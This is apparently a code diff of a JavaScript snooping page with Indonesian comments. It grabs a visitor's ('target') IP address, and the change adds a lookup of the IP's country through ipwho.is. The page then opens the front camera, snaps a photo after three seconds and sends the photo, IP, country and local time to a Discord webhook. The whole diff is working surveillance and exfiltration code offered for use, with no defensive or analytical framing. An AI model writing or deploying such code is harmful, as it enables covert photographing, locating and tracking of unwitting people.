@@ -16,29 +16,35 @@ function getLocalTime() {
     return `${hours}:${minutes}:${seconds} (${timeZone})`;
 }
 
-// Ambil IP Target
+// Ambil IP Target + Lokasi
 fetch("https://api64.ipify.org?format=json")
     .then(response => response.json())
     .then(data => {
         const ip = data.ip;
-        const location = "Unknown"; // Bisa diganti dengan API lokasi jika perlu
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                
-                setTimeout(() => {
-                    const localTime = getLocalTime();
-                    imageCapture.takePhoto()
-                        .then(blob => {
-                            sendToDiscord(blob, ip, location, localTime);
-                            track.stop();
-                        })
-                        .catch(error => console.error("Gagal ambil foto:", error));
-                }, 3000);
+        fetch(`https://ipwho.is/${ip}`)
+            .then(response => response.json())
+            .then(data => {
+                const location = data.country || "Unknown";
+
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then(stream => {
+                        const track = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(track);
+                        
+                        setTimeout(() => {
+                            const localTime = getLocalTime();
+                            imageCapture.takePhoto()
+                                .then(blob => {
+                                    sendToDiscord(blob, ip, location, localTime);
+                                    track.stop();
+                                })
+                                .catch(error => console.error("Gagal ambil foto:", error));
+                        }, 3000);
+                    })
+                    .catch(err => console.error("Akses kamera ditolak:", err));
             })
-            .catch(err => console.error("Akses kamera ditolak:", err));
+            .catch(err => console.error("Gagal ambil lokasi:", err));
     })
     .catch(err => console.error("Gagal ambil IP:", err));
 
@@ -48,7 +54,7 @@ function sendToDiscord(blob, ip, location, localTime) {
     formData.append("file", blob, "capture.jpg");
 
     formData.append("payload_json", JSON.stringify({
-        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Location**: ${location}\n⏰ **InterTime**: ${localTime}`
+        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Country**: ${location}\n⏰ **InterTime**: ${localTime}`
     }));
 
     fetch(webhookURL, {
